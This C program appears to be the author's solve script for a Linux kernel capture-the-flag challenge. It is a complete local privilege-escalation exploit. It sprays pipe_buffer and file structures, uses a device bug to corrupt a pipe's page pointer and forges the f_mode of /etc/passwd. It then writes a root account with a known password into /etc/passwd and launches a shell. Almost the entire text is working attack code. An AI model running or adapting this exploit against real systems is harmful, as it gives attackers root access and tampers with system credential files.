#include "libpwn.c"

int main(){
  // Author Solve Script Solution
  char zero[0x400] = {};
  int victim_pipefd, origin_pipefd, file_fd[NUM_SPRAY_FILE];
  int val, fake_f_mode;
  struct stat stat;
  
  printf("[+] Open %s\n", DEV_PATH);
  fd = open(DEV_PATH, O_RDWR);
  if (fd < 0) error("[-] Failed fd open");
  printf("[+] Spyraying struct pipe buffer\n");
  for (int i = 0; i < NUM_PIPE_SPRAY / 2; i++) {
    if (pipe(pipe_fd[i]) < 0) error("[-] Failed pipe_fd open");
  }
  obj_alloc();
  puts("[*] Spraying struct pipe_buffer");
  for (int i = NUM_PIPE_SPRAY / 2; i < NUM_PIPE_SPRAY; i++) {
    if (pipe(pipe_fd[i]) < 0) error("[-] Failed pipe_fd open");
  }

  puts("[*] Writing pipes to allocate pages");
  for (int i = 0; i < NUM_PIPE_SPRAY; i++) {
      val = 0xcafebabe + i;
      if (write(pipe_fd[i][1], &val, sizeof(val)) < 0) perror("[-] Failed write");
      if (write(pipe_fd[i][1], "deadbeef", 8) < 0) perror("[-] Failed write");
  }

  puts("[*] Overwitting pipe->bufs[0].page");  
  obj_write(zero, 0x400);

  puts("[*] Locating the victim pipe");
  victim_pipefd = -1;
  origin_pipefd = -1;
  for (int i = 0; i < NUM_PIPE_SPRAY; i++) {

      if (read(pipe_fd[i][0], &val, 4) < 0) perror("[-] Failed read");
      if (val != 0xcafebabe + i) {
          victim_pipefd = i;
          origin_pipefd = val - 0xcafebabe;
          printf("[+] Found: victim_pipefd = %d, origin_pipefd = %d\n", victim_pipefd, origin_pipefd);
          break;
      }
  }
  if (victim_pipefd == -1) {
      puts("[-] Failed to locate the victim pipe");
      exit(0);
  }

  puts("[*] Closing the original pipe");
  if (close(pipe_fd[origin_pipefd][0]) < 0) perror("[-] Failed close");
  if (close(pipe_fd[origin_pipefd][1]) < 0) perror("[-] Failed close");

  puts("[*] Spraying struct file of /etc/passwd");
  for (int i = 0; i < NUM_SPRAY_FILE; i++) {
      file_fd[i]= open("/etc/passwd", O_RDONLY);
      if (file_fd[i] < 0) perror("[-] Failed file_fd open");
  }

  puts("[*] Overwitting f_mode");
  fake_f_mode = 0x84f801f;
  if (write(pipe_fd[victim_pipefd][1], &fake_f_mode, 4) < 0) perror("[-] Failed write");

  char payload[] = "root:$1$deadbeef$j9ep0CjBGivAnD5z6l5rr0:0:0:root:/root:/bin/sh\n";
  if (fstat(file_fd[0], &stat) < 0) perror("[-] Failed fstat");
  if (sizeof(payload) >= stat.st_size) perror("[-] Payload size is too large");
  char *buf = malloc(stat.st_size);
  strcpy(buf, payload);

  printf("[*] Overwriting /etc/passwd with %s", payload);
  for (int i = 0; i < NUM_SPRAY_FILE; i++) {
      if (write(file_fd[i], buf, stat.st_size) != -1) {
          puts("[+] Success");
          puts("[+] You can now log in as root with the password: cafebabe");
          char *argv[] = {"/bin/sh", NULL};
          execve(argv[0], argv, NULL);
      }
  }
  puts("[-] Failed");
  while(1);
}
